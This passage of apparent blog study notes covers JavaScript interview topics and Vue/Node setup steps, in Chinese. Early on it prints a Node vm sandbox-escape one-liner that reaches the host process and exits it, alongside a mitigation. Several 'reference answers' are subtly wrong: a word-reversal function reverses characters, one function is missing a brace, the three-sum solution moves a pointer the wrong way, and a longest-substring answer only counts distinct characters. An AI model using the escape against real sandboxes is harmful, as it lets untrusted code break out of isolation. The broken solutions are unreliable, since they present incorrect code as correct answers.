code = 'x += 40; var y = 17;';  \nvm.runInContext(code, sandbox); \nconsole.log(sandbox.x); // 42 \nconsole.log(sandbox.y); // 17 \nconsole.log(x); // 1;   y is not defined.\n\nvm中提供了runInNewContext、runInThisContext、runInContext三个方法，三者的用法有个别出入，比较常用的是runInNewContext和runInContext，可以传入参数指定好上下文对象。\n但是vm是绝对安全的吗？不一定。\nconst vm = require('vm'); \nvm.runInNewContext(\"this.constructor.constructor('return process')().exit()\")\n\n通过上面这段代码，我们可以通过vm，停止掉主进程nodejs，导致程序不能继续往下执行，这是我们不希望的，解决方案是绑定好context上下文对象，同时，为了避免通过原型链逃逸（nodejs中的对象并没有像浏览器端一样进行结构化复制，导致原型链依然保留），所以我们需要切断原型链，同时对于传入的暴露对象，只提供基本类型值。\nlet ctx = Object.create(null);  \nctx.a = 1; // ctx上不能包含引用类型的属性 \nvm.runInNewContext(\"this.constructor.constructor('return process')().exit()\", ctx);\n\n让我们来看一下TSW中是怎么使用的：\nconst vm = require('vm'); \nconst SbFunction = vm.runInNewContext('(Function)', Object.create(null));        // 沙堆  \n... \nif (opt.jsonpCallback) &#123;  \n  code = `var result=null; var $&#123;opt.jsonpCallback&#125;=function($1)&#123;result=$1&#125;; $&#123;responseText&#125;; return result;`;  \n  obj = new SbFunction(code)(); \n&#125;   \n... \n\n通过runInNewContext返回沙箱中的构造函数Function，同时传入切断原型链的空对象防止逃逸，之后再外部使用的时候，只需要调用返回的这个函数，和普通的new Function一样调用即可。\n53、闭包的理解参考答案：\n闭包：\n 一个函数和对其周围状态（lexical environment，词法环境）的引用捆绑在一起（或者说函数被引用包围）， 这样的组合就是闭包（closure）。也就是说，闭包让你可以在一个内层函数中访问到其外层函数的作用域。在 JavaScript 中，每当创建一个函数，闭包就会在函数创建的同时被创建出来。\n闭包的特点：\n 让外部访问函数内部变量成为可能；​ 可以避免使用全局变量，防止全局变量污染；​ 可以让局部变量常驻在内存中；​ 会造成内存泄漏（有一块内存空间被长期占用，而不被释放）\n应用场景\n\n埋点（是网站分析的一种常用的数据采集方法）计数器\n\nfunction count() &#123;\n  var num = 0;\n  return function () &#123;\n    return ++num\n  &#125;\n&#125;\nvar getNum = count();\nvar getNewNum = count();\ndocument.querySelectorAll('button')[0].onclick = function()&#123;\n  console.log('点击加入购物车次数： '+getNum());\n&#125;\ndocument.querySelectorAll('button')[1].onclick = function()&#123;\n  console.log('点击付款次数： '+getNewNum());\n&#125;    \n\n\n事件+循环\n\n按照以下方式添加事件，打印出来的i不是按照序号的\n形成原因就是操作的是同一个词法环境,因为onclick后面的函数都是一个闭包，但是操作的是同一个词法环境\nvar lis = document.querySelectorAll('li');\nfor (var i = 0; i &lt; lis.length; i++) &#123;\n         lis[i].onclick = function () &#123;\n             alert(i)\n         &#125;       \n &#125;\n\n解决办法：\n使用匿名函数之后，就形成一个闭包， 操作的就是不同的词法环境\nvar lis = document.querySelectorAll('li');  \nfor (var i = 0; i &lt; lis.length; i++) &#123;\n     (function (j) &#123;\n                lis[j].onclick = function () &#123;\n                    alert(j)\n                &#125;\n            &#125;)(i)\n &#125;\n\n\n\n\n\n\n\n\n\n\nJS应用篇字符串中的单词逆序输出（手写）let str = \"Hello My name is kif and i am from XTU\";\nfunction reChange1(str) &#123;\n  return str.split(\"\").reverse().join(\"\");\n&#125;\nconsole.log(reChange1(str));\n\n\n\nlet str = \"Hello My name is kif and i am from XTU\";\nfunction reChange2(str) &#123;\n  let newSTr = \"\";\n  for (let i = str.length - 1; i >= 0; i--) &#123;\n    newSTr += str.charAt(i);\n  &#125;\n  return newSTr\n\nconsole.log(reChange2(str));\n\n\n\nfunction rand(min, max, N)：生成长度是N，且在min、max内不重复的整数随机数组参考答案：\n把考点拆成了4个小项；需要用递归算法实现：a) 生成一个长度为n的空数组arr。b) 生成一个（min－max）之间的随机整数rand。c) 把随机数rand插入到数组arr内，如果数组arr内已存在与rand相同的数字，则重新生成随机数rand并插入到 arr内[需要使用递归实现，不能使用for&#x2F;while等循环]d) 最终输出一个长度为n，且内容不重复的数组arr。\nMath.random//产生一个[0，1)之间的随机数。\nMath.random()：\n \n//返回指定范围的随机数(m-n之间)的公式:\nMath.random()*(n-m)+m；\n或者\nMath.random()*(n+1-m)+m\n\n\n\nfunction buildArray(arr, n, min, max) &#123;\n    var num = Math.floor(Math.random() * (max - min + 1)) + min;\n    if (!arr.includes(num)) &#123; arr.push(num); &#125;\n    return arr.length === n ? arr : buildArray(arr, n, min, max);\n&#125;\nvar result = buildArray([], 5, 2, 32);\nconsole.table(result);\n\n\n\nfunction rand(min, max, N) &#123;\n  let arr = [];\n  let l = 0;\n  console.log(N);\n  for (; l &lt; N; ) &#123;\n    // console.log(l);\n    let r = Math.floor(Math.random() * (max - min)) + min;\n    if (!arr.includes(r)) &#123;\n      console.log(r);\n      arr.push(r);\n      l++;\n    &#125;\n  &#125;\n  return arr;\n&#125;\nconsole.log(rand(2, 61, 5));\n\n\n\n\n实现一个数组对象的去重，相同value的只保留最后一个，最好有多个思路参考答案：\n1.遍历数组法\n它是最简单的数组去重方法（indexOf方法）\n实现思路：新建一个数组，遍历去要重的数组，当值不在新数组的时候（indexOf为-1）就加入该新数组中；\nvar arr=[2,8,5,0,5,2,6,7,2];\nfunction unique1(arr)&#123;\n  var hash=[];\n  for (var i = 0; i &lt; arr.length; i++) &#123;\n     if(hash.indexOf(arr[i])==-1)&#123;\n      hash.push(arr[i]);\n     &#125;\n  &#125;\n  return hash;\n&#125;\n\n2.数组下标判断法\n调用indexOf方法，性能和方法1差不多\n实现思路：如果当前数组的第 i 项在当前数组中第一次出现的位置不是 i，那么表示第 i 项是重复的，忽略掉。否则存入结果数组。\nfunction unique2(arr)&#123;\n  var hash=[];\n  for (var i = 0; i &lt; arr.length; i++) &#123;\n     if(arr.indexOf(arr[i])==i)&#123;\n      hash.push(arr[i]);\n     &#125;\n  &#125;\n  return hash;\n&#125;\n\n3.排序后相邻去除法\n实现思路：给传入的数组排序，排序后相同的值会相邻，然后遍历排序后数组时，新数组只加入不与前一值重复的值。\nfunction unique3(arr)&#123;\n  arr.sort();\n  var hash=[arr[0]];\n  for (var i = 1; i &lt; arr.length; i++) &#123;\n     if(arr[i]!=hash[hash.length-1])&#123;\n      hash.push(arr[i]);\n     &#125;\n  &#125;\n  return hash;\n&#125;\n\n4.优化遍历数组法（推荐）\n实现思路：双层循环，外循环表示从0到arr.length，内循环表示从i+1到arr.length\n将没重复的右边值放入新数组。（检测到有重复值时终止当前循环同时进入外层循环的下一轮判断）\nfunction unique4(arr)&#123;\n  var hash=[];\n  for (var i = 0; i &lt; arr.length; i++) &#123;\n    for (var j = i+1; j &lt; arr.length; j++) &#123;\n      if(arr[i]===arr[j])&#123;\n        ++i;\n        break;\n        &#125;\n    &#125;\n      hash.push(arr[i]);\n  &#125;\n  return hash;\n&#125;\n\n5.ES6实现\n基本思路：ES6提供了新的数据结构Set。它类似于数组，但是成员的值都是唯一的，没有重复的值。\nSet函数可以接受一个数组（或类似数组的对象）作为参数，用来初始化。\nfunction unique5(arr)&#123;\n  var x = new Set(arr);\n return [...x];\n&#125;\n\n扩展：如果重复，则去掉该元素\n数组下标去重\nfunction unique22(arr)&#123;\n  var hash=[];\n  for (var i = 0; i &lt; arr.length; i++) &#123;\n     if(arr.indexOf(arr[i])==arr.lastIndexOf(arr[i]))&#123;\n      hash.push(arr[i]);\n     &#125;\n  &#125;\n  return hash;\n&#125;\n\n传入 [1,[[2],3,4],5] ，返回 [1,2,3,4,5]let a = [1, [[2], '3', 4], 5];\nfunction change(arr) &#123;\n  let x = arr.toString();\n  let list = x.split(\",\");\n  let ans = list.map((i) => &#123;\n    // console.log(i)\n    return typeof i === 'string' ? Number(i) : i;\n  &#125;);\n  // console.log(ans)\n  return ans;\n&#125;\nconsole.log(change(a));\n\n\n​       \nES6 增加了扩展运算符，用于取出参数对象的所有可遍历属性，拷贝到当前对象之中：\nvar arr = [1, [2, [3, 4]]];\nconsole.log([].concat(...arr)); // [1, 2, [3, 4]]\n\n我们用这种方法只可以扁平一层，但是顺着这个方法一直思考，我们可以写出这样的方法：\n// 方法4\nvar arr = [1, [2, [3, 4]]];\n\nfunction flatten(arr) &#123;\n\n    while (arr.some(item => Array.isArray(item))) &#123;\n        arr = [].concat(...arr);\n    &#125;\n\n    return arr;\n&#125;\n\nconsole.log(flatten(arr))\n\n\n\n用正则和非正则实现12345678.12&#x3D;》12，345，678.12let num = 12345678.12\n//12,345,678.12\nfunction change(number) &#123;\n    let s = number.toString()\n    //console.log(s)\n    let L = s.split('.')\n    let num_s\n    L.length == 2 ? num_s = L[1] : num_s = -1\n    let N=L[0]\n    let num_f\n    let y =N.length % 3\n    num_f = N.slice(0, y)\n\n    for (let i = y; i &lt; N.length; i += 3) &#123;\n        num_f += ',' + N.slice(i,i+3)\n    &#125;\n    if (num_s != -1) &#123;\n        num_f += '.' + num_s\n    &#125;\n    return num_f\n&#125;\nconsole.log(change(num))//12,345,678.12\n\n\n\n写一个判断是否是空对象的函数参考答案：\nfunction isEmpty(value) &#123;\n    return (\n        value === null || value === undefined ||\n        (typeof value === 'object' &amp;&amp; Object.keys(value).length === 0) \n    )\n&#125;\n\n\n\n给定一个字符串，请你找出其中不含有重复字符的 最长子串 的长度function countWord(str) &#123;\n  let arr = [];\n  let count = 0;\n  for (let i = 0; i &lt; str.length; i++) &#123;\n    console.log(str.charAt(i));\n    if (!arr.includes(str.charAt(i))) &#123;\n      arr.push(str[i]);\n      count++;\n    &#125;\n  &#125;\n  console.log(arr);\n  return count;\n&#125;\nlet str = \"qqdwqcasdffdghjsbjhbm\";\nconsole.log(countWord(str));\n\n\n\n\n三数之和参考答案：\n题目描述\n给定一个包含 n 个整数的数组 nums，判断 nums 中是否存在三个元素 a，b，c ，使得 a + b + c &#x3D; 0 ？找出所有满足条件且不重复的三元组。\n注意：答案中不可以包含重复的三元组。\n//例如, 给定数组 nums = [-1, 0, 1, 2, -1, -4]，\n//满足要求的三元组集合为：\n[\n  [-1, 0, 1],\n  [-1, -1, 2]\n]\n\n\n\n\n\nlet nums = [-1, 0, 1, 2, -1, -4];\nfunction getNum(nums) &#123;\n  if (nums.length &lt; 3) &#123;\n    return [];\n  &#125;\n  let ans = [];\n  nums.sort((a, b) => a - b);\n  console.log(nums);\n  for (let i = 0; i &lt; nums.length; i++) &#123;\n    if (nums[i] > 0) &#123;\n      break;\n    &#125;\n    let l = i + 1;\n    let r = nums.length - 1;\n    while (l &lt; r) &#123;\n      let sum = nums[i] + nums[l] + nums[r];\n      if (sum == 0) &#123;\n        ans.push(nums[i], nums[l], nums[r]);\n        l++;\n        r++;\n      &#125; else if (sum > 0) &#123;\n        r--;\n      &#125; else &#123;\n        l++;\n      &#125;\n    &#125;\n  &#125;\n  return ans;\n&#125;\nconsole.log(getNum(nums));\n\n\n\n\njs判断数据类型function getTypeOf(x) &#123;\n  if (typeof (x) != 'object') &#123;\n      return typeof (x)\n  &#125; else &#123;\n      return Object.prototype.toString.apply(x)\n  &#125;\n&#125;\nlet test = [12, [], function () &#123; &#125;, true, 'kif']\nlet x\nfor (x in test) (\n  console.log(getTypeOf(test[x]))\n)\n\n\n\narr.flat(Infinity)flat作为ES6的新特性，只要调用该方法便可以简单快速实现数组的扁平化，使用起来确实很容易上手(可以说是0门槛)，但是只会这个方法是没有办法得到面试官的青睐的！\nconst arr = [1, [2, [3, [4, [5]]]]];``// 1. flat自动展开``let arr1 = arr.flat(Infinity);``console.log(arr1); ``// [ 1, 2, 3, 4, 5 ]\n\n\n\n","slug":"重温前端-js篇","date":"2022-02-03T07:42:00.000Z","categories_index":"学习笔记,前端","tags_index":"Javascript","author_index":"kif"},{"id":"d930d8d84c4a2ee4a4d63f3e717c54e0","title":"2021C.S.N夏令营VUE班级讲义","content":"一、课程安排1.学前基础html、css、javascript、ajax\n2.开发工具2.1 下载安装Vscode\n前端VUE项目，原先的开发工具是HBuilderX（上手快捷，使用方便），但是随着项目规模的增大，随之而来的是维护和管理成本的不可控（手下码农或者是实习生随性而发的编写格式，代码习惯，维护起来简直就是地狱！！！）。这个问题目前看来最优解就是引入ESLINT，参考其他大厂前端编码规范，制定一套符合自己的前端编码规范（并硬性地要求开发在编程时严格准守这套规范，甚至是不符合规范就无法正常启动项目的程度）。无奈HBuilder引入eslint问题多多，最终放弃。之前刚学习vue的时候使用vscode感觉他eslint插件就很符合现在的情况，一点小格式错误就直接报错了，给初学者的我都整蒙了，一气之下直接关了eslint。所以现在重回VScode，整理一套搭建前端开发环境的流程，供大家参考学习。\n下载地址：https://code.visualstudio.com/Download#\n按照自己实际情况选择下载安装包（一般是Windows System Installer 64bit）\n以及在选择附加任务的时候，建议选中“添加到PATH（重启后生效）”。\n\n2.2 插件安装\n点击左侧倒数第二个Extensions按钮，进入插件市场，安装如图所示插件：\nChinese (Simplified) Language Pack for Visual Studio CodeESLintGitLens — Git superchargedVeturPrettier - Code formatter第一个中文语言包可选，第二个ESLint代码校验插件，第三个git管理工具，第四个vue开发插件，第五个代码格式化插件\n2.3 环境校验\n打开内置控制台，分步输入以下指令，检查环境是否已安装。node -v （检查node是否已安装）npm -v （检查npm 是否已安装）vue （检查vue是否已安装）\n\n3.课程安排\n二、Vue简介1. 官网https://cn.vuejs.org/\n\nVue.js（读音 &#x2F;vjuː&#x2F;, 类似于 view） 是一套构建用户界面的渐进式框架。\nVue 只关注视图层， 采用自底向上增量开发的设计。\nVue 的目标是通过尽可能简单的 API 实现响应的数据绑定和组合的视图组件。\n2.作者尤雨溪，前端框架Vue.js的作者，HTML5版Clear的打造人，独立开源开发者。曾就职于Google Creative Labs和Meteor Development Group。由于工作中大量接触开源的JavaScript项目，最后自己也走上了开源之路，现全职开发和维护Vue.js。\n\n\n三、Node安装Windows 上安装 Node.jsNode.js 安装包及源码下载地址为：https://nodejs.org/en/download/。\n\n检测PATH环境变量是否配置了Node.js，点击开始&#x3D;》运行&#x3D;》输入”cmd” &#x3D;&gt; 输入命令”path”，输出如下结果：\nPATH&#x3D;C:\\oraclexe\\app\\oracle\\product\\10.2.0\\server\\bin;C:\\Windows\\system32;\nC:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;\nc:\\python32\\python;C:\\MinGW\\bin;C:\\Program Files\\GTK2-Runtime\\lib;\nC:\\Program Files\\MySQL\\MySQL Server 5.5\\bin;C:\\Program Files\\nodejs\\;\nC:\\Users\\rg\\AppData\\Roaming\\npm\n\n我们可以看到环境变量中已经包含了C:\\Program Files\\nodejs\\\n检查Node.js版本\nnode –version\n\n用处参考：\nhttps://www.runoob.com/vue2/vue-install.html\n四、Vue安装1、独立版本我们可以在 Vue.js 的官网上直接下载 vue.min.js 并用 script 标签引入。\nhttps://vuejs.org/js/vue.min.js\n2、使用 CDN 方法以下推荐国外比较稳定的两个 CDN，国内还没发现哪一家比较好，目前还是建议下载到本地。\n\nStaticfile CDN（国内） : https://cdn.staticfile.org/vue/2.2.2/vue.min.js\nunpkg：https://unpkg.com/vue/dist/vue.js, 会保持和 npm 发布的最新的版本一致。\ncdnjs : https://cdnjs.cloudflare.com/ajax/libs/vue/2.1.8/vue.min.js\n\n3、NPM 方法npm: nodejs 下的包管理器。\nwebpack: 它主要用途是通过CommonJS 的语法把所有浏览器端需要发布的静态资源作相应的准备，比如资源的合并和打包。\nvue-cli: 用户生成Vue工程模板。（帮你快速开始一个vue的项目，也就是给你一套vue的结构，包含基础的依赖库，只需要npm install 就可以安装。\n\nnpm配置模块路径、cache路径\n先配置npm的全局模块的存放路径以及cache的路径\n具体方法：在NodeJs下建立”node_global”及”node_cache”两个文件夹。如下图\n\n然后运行以下2条命令\nnpm config set prefix &quot;D:\\program files\\nodejs\\node_global&quot;\n\nnpm config set cache &quot;D:\\program files\\nodejs\\node_cache&quot;\n\n\n输入命令配置镜像站\nnpm config set registry&#x3D;http:&#x2F;&#x2F;registry.npm.taobao.org \n\n输入命令显示所有配置信息\nnpm config list \n\n\n检查一下镜像站行不行命令\nnpm info vue\n\n\n注意，此时，默认的模块D:\\program files\\nodejs\\node_modules目录\n将会改变为D:\\program files\\nodejs\\node_global\\node_modules 目录，\n如果直接运行npm install等命令会报错的。\n我们需要做1件事情：增加环境变量NODE_PATH 内容是：D:\\program files\\nodejs\\node_global\\node_modules，\n\n\n注意，一下操作需要重新打开CMD让上面的环境变量生效\n参考：https://www.php.cn/js-tutorial-414607.html\n全局安装 vue-clinpm install --global vue-cli\n\n\n\n创建一个基于 webpack 模板的新项目路径！\nvue init webpack my-project\n\n\n\n\n\nVue build &#x3D;&#x3D;&gt; 打包方式，回车即可；\nInstall vue-router &#x3D;&#x3D;&gt; 是否要安装 vue-router，项目中肯定要使用到 所以Y 回车；\nUse ESLint to lint your code &#x3D;&#x3D;&gt; 是否需要 js 语法检测 目前我们不需要 所以 n 回车；\nSet up unit tests &#x3D;&#x3D;&gt; 是否安装 单元测试工具 目前我们不需要 所以 n 回车；\nSetup e2e tests with Nightwatch &#x3D;&#x3D;&gt; 是否需要 端到端测试工具 目前我们不需要 所以 n 回车；\n\n安装依赖cd my-projectnpm i\n\n\n启动项目npm run dev\n\n\n\nctrl c结束\n参考：\nhttps://www.cnblogs.com/hellman/p/10985377.html\n五、vue项目目录讲解\n　1、build：构建脚本目录\n　　　　1）build.js  &#x3D;&#x3D;&gt; 生产环境构建脚本；&#96;&#96;\n　　　　2）check-versions.js  &#x3D;&#x3D;&gt; 检查npm，node.js版本；\n　　　　3）utils.js  &#x3D;&#x3D;&gt; 构建相关工具方法；\n　　　　4）vue-loader.conf.js  &#x3D;&#x3D;&gt; 配置了css加载器以及编译css之后自动添加前缀；\n　　　　5）webpack.base.conf.js  &#x3D;&#x3D;&gt; webpack基本配置；\n　　　　6）webpack.dev.conf.js  &#x3D;&#x3D;&gt; webpack开发环境配置；\n　　　　7）webpack.prod.conf.js  &#x3D;&#x3D;&gt; webpack生产环境配置；\n　　2、config：项目配置\n　　　　1）dev.env.js  &#x3D;&#x3D;&gt; 开发环境变量；\n　　　　2）index.js  &#x3D;&#x3D;&gt; 项目配置文件；\n　　　　3）prod.env.js  &#x3D;&#x3D;&gt; 生产环境变量；\n　　3、node_modules：npm 加载的项目依赖模块\n　　4、src：这里是我们要开发的目录，基本上要做的事情都在这个目录里。里面包含了几个目录及文件：\n　　　　1）assets：资源目录，放置一些图片或者公共js、公共css。这里的资源会被webpack构建；\n　　　　2）components：组件目录，我们写的组件就放在这个目录里面；\n　　　　3）router：前端路由，我们需要配置的路由路径写在index.js里面；\n　　　　4）App.vue：根组件；\n　　　　5）main.js：入口js文件；\n　　5、static：静态资源目录，如图片、字体等。不会被webpack构建\n　　6、index.html：首页入口文件，可以添加一些 meta 信息等\n　　7、package.json：npm包配置文件，定义了项目的npm脚本，依赖包等信息&#96;&#96;\n　　8、README.md：项目的说明文档，markdown 格式\n　　9、.xxxx文件：这些是一些配置文件，包括语法配置，git配置等\nrouter&#x2F;index.js&#x2F;&#x2F;引入Vueimport Vue from &#39;vue&#39;;  &#x2F;&#x2F;引入vue-router              import Router from &#39;vue-router&#39;;&#x2F;&#x2F;引入根目录下的HelloWorld.vue组件import HelloWorld from &#39;@&#x2F;components&#x2F;HelloWorld&#39;;&#x2F;&#x2F;Vue全局使用RouterVue.use(Router);export default new Router(&#123;  &#x2F;&#x2F;配置路由，这里是个数组  routes: [    &#123;                           &#x2F;&#x2F;每一个链接都是一个对象      path: &#39;&#x2F;&#39;,                &#x2F;&#x2F;链接路径      name: &#39;HelloWorld&#39;,       &#x2F;&#x2F;路由名称，可以在router-link和router.push中使用，就相当于这个组件了      component: HelloWorld     &#x2F;&#x2F;对应的组件模板    &#125;  ]&#125;);\n\n\n\n\n\n\n\n六、开始我们的第一个vue项目1.使用vscode，新建.vue文件，自动生成vue文件代码块模板文件 –&gt; 首选项 –&gt; 用户代码片段 –&gt; 输入vue，选择vue.json –&gt;复制下面代码内容并保存\n无vue.json 的选vue-html\n\n&#123;  &quot;Print to console&quot;: &#123;    &quot;prefix&quot;: &quot;Vue模板&quot;,    &quot;body&quot;: [      &quot;&lt;template&gt;&quot;,      &quot;\\t&lt;div&gt;\\n&quot;,      &quot;\\t&lt;&#x2F;div&gt;&quot;,      &quot;&lt;&#x2F;template&gt;\\n&quot;,      &quot;&lt;script&gt;&quot;,      &quot;\\texport default &#123;&quot;,      &quot;\\t\\tprops: &#123;\\n&quot;,      &quot;\\t\\t&#125;,&quot;,      &quot;\\t\\tcomponents: &#123;\\n&quot;,      &quot;\\t\\t&#125;,&quot;,      &quot;\\t\\tdata()&#123;&quot;,      &quot;\\t\\t\\treturn &#123;\\n\\t\\t\\t\\t$0&quot;,      &quot;\\t\\t\\t&#125;&quot;,      &quot;\\t\\t&#125;,&quot;,      &quot;\\t\\tmethods: &#123;\\n&quot;,      &quot;\\t\\t&#125;&quot;,      &quot;\\t&#125;&quot;,      &quot;&lt;&#x2F;script&gt;\\n&quot;,      &quot;&lt;style lang&#x3D;\\&quot;scss\\&quot;&gt;\\n&quot;,      &quot;&lt;&#x2F;style&gt;&quot;    ],    &quot;description&quot;: &quot;Vue模板&quot;  &#125;&#125;\n\n\n\n添加配置，让vscode允许自定义的代码片段提示出来文件 –&gt; 首选项 –&gt; 设置 —&gt; 添加这2项\n“editor.snippetSuggestions”: “top”,“editor.formatOnPaste”: true\n\n\n\n测试是否添加成功测试方法： 新建vue后缀文件，在空白文件内输入vue会出现提示，利用上下箭头选择第二个”vue模板“按下回车，如下面第二张就OK了\n\n\n1、在components目录下新建一个views目录，里面写我们的vue组件\n　　　　1）开始我们的第一个组件：\n　　　　a：在views目录下新建First.vue\n　　　　b：在router目录下的index.js里面配置路由路径\n\n预定报错\n\nnpm install less@3.12.2 less-loader@4.1.0 --save-dev\n\n\n\n2.自动打开浏览器　1）打开config &#x3D;&#x3D;&gt; index.js\n　2）module.exports配置中找到autoOpenBrowser，默认设置的是false\n3）将autoOpenBrowser改为true\n为了避免端口冲突，也可以修改port，打开目录同上\n\n作业1：去除链接中的#\n一、vue项目携带一个#会对开发造成一定的影响：\n1、微信三方登录回调地址，有#号时，接收不到code参数\n2、微信H5支付的回调地址，不允许有#\n3、App分享，处理特殊字符时，可能会对#进行编译\n4、有点影响美观\n现在网站大多有三方登录，支付等功能，存在#，项目开发就存在很大的障碍。话不多说，开始去掉#吧。\nhttp:&#x2F;&#x2F;localhost:8081&#x2F;#&#x2F;first\n\nmode: &#39;history&#39;,\n\n\n\n七、使用路由搭建单页应用新建一个Second.vue组件\n路由跳转：\n&lt;router-link to&#x3D;&quot;&#x2F;second&quot;&gt;去第二个页面&lt;&#x2F;router-link&gt;\n\n\n\n\n\n&lt;template&gt;  &lt;div&gt;    &lt;h1&gt;kif&lt;&#x2F;h1&gt;    &lt;topView text&#x3D;&quot;注册&quot; @message&#x3D;&quot;getmessage&quot;&gt;&lt;&#x2F;topView&gt; &lt;p&gt;&lt;router-link to&#x3D;&quot;&#x2F;second&quot;&gt;去第二个页面&lt;&#x2F;router-link&gt;&lt;&#x2F;p&gt;   &lt;&#x2F;div&gt;&lt;&#x2F;template&gt;&lt;script&gt; import topView from &#39;..&#x2F;components&#x2F;mod&#x2F;topView&#39;export default &#123;   props: &#123;&#125;,  components: &#123;    topView  &#125;,  data() &#123;    return &#123;        &#125;;  &#125;,  methods: &#123;    getmessage(val)    &#123;      console.log(val)    &#125;      &#125;,&#125;;&lt;&#x2F;script&gt;&lt;style&gt;&lt;&#x2F;style&gt;\n\n\n\n\n八、用less写样式什么是LESS？LESS是一个CSS预处理器，可以为网站启用可自定义，可管理和可重用的样式表。 LESS是一种动态样式表语言，扩展了CSS的功能。 LESS也是跨浏览器友好。\nCSS预处理器是一种脚本语言，可扩展CSS并将其编译为常规CSS语法，以便可以通过Web浏览器读取。 它提供诸如变量，函数， mixins 和操作等功能，可以构建动态CSS。\nhttps://less.bootcss.com/#%E6%A6%82%E8%A7%88\n安装less依赖：npm install less less-loader --save\n\n\n安装成功之后，可在package.json中看到，多增加了2个模块：\n\n在main.js\nimport less from &#39;less&#39;Vue.use(less)\n\n编写less\n&lt;style lang&#x3D;&quot;less&quot; rel&#x3D;&quot;stylesheet&#x2F;less&quot; scoped&gt;&lt;&#x2F;style&gt;\n\n报错：\n\n解决：https://blog.csdn.net/qq_44617099/article/details/114973132\n原因\nless-loader版本过高解决办法\n卸载原来的less和less-loader\nnpm uninstall less-loader  npm uninstall less \n\nnpm install less@3.12.2 less-loader@4.1.0 --save-dev\n\n\n\n1.多层嵌套&lt;div id&#x3D;&quot;mainView&quot;&gt;    &lt;h1&gt;kif&lt;&#x2F;h1&gt;    &lt;topView text&#x3D;&quot;注册&quot; @message&#x3D;&quot;getmessage&quot;&gt;&lt;&#x2F;topView&gt;    &lt;div class&#x3D;&quot;firstView&quot;&gt;      View1      &lt;div class&#x3D;&quot;secondView&quot;&gt;        view2      &lt;&#x2F;div&gt;    &lt;&#x2F;div&gt;&lt;style lang&#x3D;&quot;less&quot; rel&#x3D;&quot;stylesheet&#x2F;less&quot; scoped&gt;#mainView&#123;  height: 200px;  width: 200px;  background-color: antiquewhite;  .firstView&#123;    height: 100px;    width: 100px;    background-color: aqua;    .secondView    &#123;      width: 50px;      height: 50px;      background-color: aliceblue;    &#125;  &#125;&#125;\n\n\n\n2.less中变量的使用在less，允许我们使用以变量的形式来定义，定义方式：@k:v; 使用方式：@k;\n&lt;style lang&#x3D;&quot;less&quot; rel&#x3D;&quot;stylesheet&#x2F;less&quot; scoped&gt;@mycolor : #FFCA28;#mainView&#123;  height: 200px;  width: 200px;  background-color: antiquewhite;  .firstView&#123;    height: 100px;    width: 100px;    background-color: aqua;    .secondView    &#123;      width: 50px;      height: 50px;      background-color: @mycolor;    &#125;  &#125;&#125;&lt;&#x2F;style&gt;\n\n\n3.字符串拼接变量使用方式；&lt;style lang&#x3D;&quot;less&quot; rel&#x3D;&quot;stylesheet&#x2F;less&quot; scoped&gt;@mycolor : #FFCA28;@static :&#39;..&#x2F;assets&#x2F;&#39;;#mainView&#123;  height: 200px;  width: 200px;  background-color: antiquewhite;  .firstView&#123;    height: 100px;    width: 100px;   background: url(&quot;@&#123;static&#125;bac.png&quot;);    .secondView    &#123;      width: 50px;      height: 50px;      background-color: @mycolor;    &#125;  &#125;&#125;&lt;&#x2F;style&gt;\n\n注意：路径需要用””包裹，@{img}这种凡是把变量引进来才能生效；\n\n4.混合 &#x3D; 函数&lt;div class&#x3D;&quot;box1&quot;&gt;我是box1&lt;&#x2F;div&gt;&lt;div class&#x3D;&quot;box2&quot;&gt;我是box2&lt;&#x2F;div&gt; &lt;style lang&#x3D;&quot;less&quot;&gt;&#x2F;&#x2F;定义一个函数；.test(@color:red,@size:14px)&#123;    background: @color;    font-size:@size;&#125;.box1&#123;&#x2F;&#x2F;  不传参，使用默认的；    .test()&#125;.box2&#123;&#x2F;&#x2F;  给函数传参；    .test(@color:green,@size:30px)&#125;&lt;&#x2F;style&gt;\n\n\n\n\n参考：\nhttps://www.jianshu.com/p/779ed2c368a3\n九、Vue.js 模板语法Vue.js 使用了基于 HTML 的模板语法，允许开发者声明式地将 DOM 绑定至底层 Vue 实例的数据。\nVue.js 的核心是一个允许你采用简洁的模板语法来声明式的将数据渲染进 DOM 的系统。\n结合响应系统，在应用状态改变时， Vue 能够智能地计算出重新渲染组件的最小代价并应用到 DOM 操作上。\n1.插值文本数据绑定最常见的形式就是使用\n &#123;&#123;...&#125;&#125;\n（双大括号）的文本插值\nHtml使用 v-html 指令用于输出 html 代码：\n\n\n属性HTML 属性中的值应使用 v-bind 指令。\n以下实例判断 use 的值，如果为 true 使用 class1 类的样式，否则不使用该类：\n\n\n表达式Vue.js 都提供了完全的 JavaScript 表达式支持。\n\n2.指令指令是带有 v- 前缀的特殊属性。\n指令用于在表达式的值改变时，将某些行为应用到 DOM 上。\nv-ifv-model在 input 输入框中我们可以使用 v-model 指令来实现双向数据绑定：\n\n\nv-model 指令用来在 input、select、textarea、checkbox、radio 等表单控件元素上创建双向数据绑定，根据表单上的值，自动更新绑定的元素的值。\n按钮的事件我们可以使用 v-on 监听事件，并对用户的输入进行响应。\n以下实例在用户点击按钮后对字符串进行反转操作：\n\n\n3.缩写v-bind 缩写Vue.js 为两个最为常用的指令提供了特别的缩写：\n&lt;!-- 完整语法 --&gt;&lt;a v-bind:href&#x3D;&quot;url&quot;&gt;&lt;&#x2F;a&gt;&lt;!-- 缩写 --&gt;&lt;a :href&#x3D;&quot;url&quot;&gt;&lt;&#x2F;a&gt;\n\nv-on 缩写&lt;!-- 完整语法 --&gt;&lt;a v-on:click&#x3D;&quot;doSomething&quot;&gt;&lt;&#x2F;a&gt;&lt;!-- 缩写 --&gt;&lt;a @click&#x3D;&quot;doSomething&quot;&gt;&lt;&#x2F;a&gt;\n\n\n\n十、Vue.js 条件语句1.条件判断v-if&lt;div id=\"app\">    &lt;p v-if=\"seen\">现在你看到我了&lt;/p>    &lt;div v-if=\"ok\">      &lt;p>哈哈哈，打字辛苦啊！！！&lt;/p>    &lt;/div>&lt;/div>&lt;script>new Vue(&#123;  el: '#app',  data: &#123;    seen: true,    ok: true  &#125;&#125;)&lt;/script>\n\n\n\nv-else可以用 v-else 指令给 v-if 添加一个 “else” 块：\n&lt;div v-if=\"Math.random()>0.5\">      &lt;p>fasf111111111&lt;/p>    &lt;/div>    &lt;div v-else>      &lt;p>qwerq3433333333333&lt;/p>    &lt;/div>\n\nv-show我们也可以使用 v-show 指令来根据条件展示元素：\n&lt;h1 v-show=\"ok\">Hello!&lt;/h1>\n\n十一.Vue.js 循环语句v-forv-for 指令需要以 site in sites 